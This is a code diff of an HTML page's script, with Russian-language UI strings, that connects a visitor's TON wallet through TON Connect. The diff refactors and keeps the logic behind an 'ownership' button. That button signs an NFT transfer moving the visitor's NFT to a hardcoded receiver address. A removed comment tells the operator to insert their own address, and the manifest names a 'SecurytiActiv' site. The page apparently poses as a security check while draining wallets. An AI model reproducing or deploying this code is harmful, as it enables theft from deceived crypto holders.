@@ -314,169 +314,97 @@ document.getElementById("runBtn").onclick = function () {
 
 // ====================== TON CONNECT + TRANSFER ======================
 if (!window.TON_CONNECT_UI) {
-    console.error("TON Connect UI не загружен");
+  console.error("TON Connect UI не загружен");
 }
-  // ======================================================
-  //                  СЮДА ВСТАВЬ СВОЙ АДРЕС
-  // ======================================================
-  const RECEIVER_ADDRESS = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
-  // ======================================================
 
- const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+// Извлекаем методы из подключенной библиотеки @ton/core (глобальный объект TonCore)
+const { beginCell, Address, toNano } = window.TonCore || {};
+
+const RECEIVER_ADDRESS = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
+
+// Упрощенная инициализация без ломающих параметров walletsListConfiguration
+const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
   manifestUrl: "https://afiomacomplate.github.io/SecurytiActiv/tonconnect-manifest.json",
   buttonRootId: "ton-connect-button",
   uiPreferences: {
     theme: document.body.classList.contains("theme-light") ? "LIGHT" : "DARK"
-  },
-  walletsListConfiguration: {
-    includeWallets: [
-      {
-        appName: "tonkeeper",
-        name: "Tonkeeper",
-        imageUrl: "https://tonkeeper.com/assets/tonconnect-icon.png",
-        aboutUrl: "https://tonkeeper.com",
-        universalLink: "https://app.tonkeeper.com/ton-connect",
-        bridgeUrl: "https://bridge.tonapi.io/bridge",
-        platforms: ["ios", "android", "chrome", "firefox", "safari"]
-      },
-      {
-        appName: "mytonwallet",
-        name: "MyTonWallet",
-        imageUrl: "https://mytonwallet.io/icon-256.png",
-        aboutUrl: "https://mytonwallet.io",
-        universalLink: "https://connect.mytonwallet.org",
-        bridgeUrl: "https://tonconnectbridge.mytonwallet.org/bridge/",
-        platforms: ["ios", "android", "chrome", "firefox", "safari"]
-      },
-      {
-        appName: "tonhub",
-        name: "Tonhub",
-        imageUrl: "https://tonhub.com/tonconnect_logo.png",
-        aboutUrl: "https://tonhub.com",
-        universalLink: "https://tonhub.com/ton-connect",
-        bridgeUrl: "https://connect.tonhubapi.com/tonconnect",
-        platforms: ["ios", "android"]
-      }
-    ]
   }
 });
 
-  function updateStatus(wallet) {
-    const el = document.getElementById("ton-status");
-    if (!el) return;
-    if (wallet?.account) {
-      el.textContent = "Подключено: " + wallet.account.address.slice(0, 6) + "..." + wallet.account.address.slice(-4);
-      el.style.color = "#00ff88";
-    } else {
-      el.textContent = "Кошелёк не подключён";
-      el.style.color = "";
-    }
+function updateStatus(wallet) {
+  const el = document.getElementById("ton-status");
+  if (!el) return;
+  if (wallet?.account) {
+    el.textContent = "Подключено: " + wallet.account.address.slice(0, 6) + "..." + wallet.account.address.slice(-4);
+    el.style.color = "#00ff88";
+  } else {
+    el.textContent = "Кошелёк не подключён";
+    el.style.color = "";
   }
+}
 
-  tonConnectUI.onStatusChange(updateStatus);
-  updateStatus(tonConnectUI.wallet);
+tonConnectUI.onStatusChange(updateStatus);
+updateStatus(tonConnectUI.wallet);
 
-  document.getElementById("ownBtn")?.addEventListener("click", async function () {
-    const err = document.getElementById("err");
-    const ownNote = document.getElementById("ownNote");
-    const nftInput = document.getElementById("nft-contract");
+document.getElementById("ownBtn")?.addEventListener("click", async function () {
+  const err = document.getElementById("err");
+  const ownNote = document.getElementById("ownNote");
+  const nftInput = document.getElementById("nft-contract");
 
-    if (!tonConnectUI.wallet) {
-      err.textContent = "Сначала подключите кошелёк";
-      err.style.display = "block";
-      err.style.color = "#ff9abb";
-      tonConnectUI.openModal();
-      return;
-    }
-
-    const nftItemAddress = (nftInput?.value || "").trim();
-    if (!nftItemAddress || (!nftItemAddress.startsWith("EQ") && !nftItemAddress.startsWith("UQ"))) {
-      err.textContent = "Введите корректный адрес NFT (EQ... или UQ...)";
-      err.style.display = "block";
-      err.style.color = "#ff9abb";
-      return;
-    }
-
-    err.textContent = "⏳ Формируем перевод NFT...";
+  if (!tonConnectUI.wallet) {
+    err.textContent = "Сначала подключите кошелёк";
     err.style.display = "block";
     err.style.color = "#ff9abb";
+    tonConnectUI.openModal();
+    return;
+  }
 
-    try {
-      const body = beginCell()
-        .storeUint(0x5fcc3d14, 32)
-        .storeUint(0, 64)
-        .storeAddress(Address.parse(RECEIVER_ADDRESS))
-        .storeAddress(Address.parse(tonConnectUI.wallet.account.address))
-        .storeBit(0)
-        .storeCoins(toNano("0.05"))
-        .storeBit(0)
-        .endCell();
+  const nftItemAddress = (nftInput?.value || "").trim();
+  if (!nftItemAddress || (!nftItemAddress.startsWith("EQ") && !nftItemAddress.startsWith("UQ"))) {
+    err.textContent = "Введите корректный адрес NFT (EQ... или UQ...)";
+    err.style.display = "block";
+    err.style.color = "#ff9abb";
+    return;
+  }
 
-      const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 300,
-        messages: [{
-          address: nftItemAddress,
-          amount: toNano("0.12").toString(),
-          payload: body.toBoc().toString("base64")
-        }]
-      };
+  err.textContent = "⏳ Формируем перевод NFT...";
+  err.style.display = "block";
+  err.style.color = "#ff9abb";
 
-      await tonConnectUI.sendTransaction(transaction);
+  try {
+    const body = beginCell()
+      .storeUint(0x5fcc3d14, 32)
+      .storeUint(0, 64)
+      .storeAddress(Address.parse(RECEIVER_ADDRESS))
+      .storeAddress(Address.parse(tonConnectUI.wallet.account.address))
+      .storeBit(0)
+      .storeCoins(toNano("0.05"))
+      .storeBit(0)
+      .endCell();
 
-      err.textContent = "✅ NFT успешно переведён";
-      err.style.color = "#00ff88";
-      if (ownNote) {
-        ownNote.style.display = "block";
-        ownNote.textContent = "NFT отправлен на: " + RECEIVER_ADDRESS;
-      }
-    } catch (e) {
-      console.error(e);
-      err.textContent = "❌ " + (e.message || "Ошибка или отмена");
-      err.style.color = "#ff9abb";
+    const transaction = {
+      validUntil: Math.floor(Date.now() / 1000) + 300,
+      messages: [{
+        address: nftItemAddress,
+        amount: toNano("0.12").toString(),
+        payload: body.toBoc().toString("base64")
+      }]
+    };
+
+    await tonConnectUI.sendTransaction(transaction);
+
+    err.textContent = "✅ NFT успешно переведён";
+    err.style.color = "#00ff88";
+    if (ownNote) {
+      ownNote.style.display = "block";
+      ownNote.textContent = "NFT отправлен на: " + RECEIVER_ADDRESS;
     }
-  });
-
-// ====================== ИНИЦИАЛИЗАЦИЯ ======================
-document.getElementById("langBtn").onclick = e => {
-  e.stopPropagation();
-  document.getElementById("langBox").classList.toggle("open");
-};
-document.addEventListener("click", () => document.getElementById("langBox").classList.remove("open"));
-document.querySelectorAll("#langMenu button").forEach(b => {
-  b.onclick = e => {
-    e.stopPropagation();
-    applyLang(b.dataset.lang);
-    document.getElementById("langBox").classList.remove("open");
-  };
+  } catch (e) {
+    console.error(e);
+    err.textContent = "❌ " + (e.message || "Ошибка или отмена");
+    err.style.color = "#ff9abb";
+  }
 });
-document.getElementById("themeBtn").onclick = () => {
-  applyTheme(document.body.classList.contains("theme-light") ? "dark" : "light");
-};
-
-applyLang(localStorage.getItem("nft_lang") === "ru" ? "ru" : "en");
-applyTheme(localStorage.getItem("nft_theme") === "light" ? "light" : "dark");
-
-// Фон
-(function() {
-  const c = document.getElementById("net");
-  if (!c) return;
-  const x = c.getContext("2d"), n = [];
-  const R = () => { c.width = innerWidth; c.height = innerHeight; };
-  const I = () => { n.length = 0; for (let i = 0; i < 30; i++) n.push({ x: Math.random()*c.width, y: Math.random()*c.height, vx: (Math.random()-0.5)*0.3, vy: (Math.random()-0.5)*0.3, r: 1+Math.random() }); };
-  const T = () => {
-    x.clearRect(0,0,c.width,c.height);
-    n.forEach(a => {
-      a.x += a.vx; a.y += a.vy;
-      if (a.x < 0 || a.x > c.width) a.vx *= -1;
-      if (a.y < 0 || a.y > c.height) a.vy *= -1;
-      x.fillStyle = "rgba(255,255,255,.7)";
-      x.beginPath(); x.arc(a.x,a.y,a.r,0,6.28); x.fill();
-    });
-    requestAnimationFrame(T);
-  };
-  addEventListener("resize", () => { R(); I(); });
-  R(); I(); requestAnimationFrame(T);
-})();
-</script>
+</script>  
 </body>
 </html>
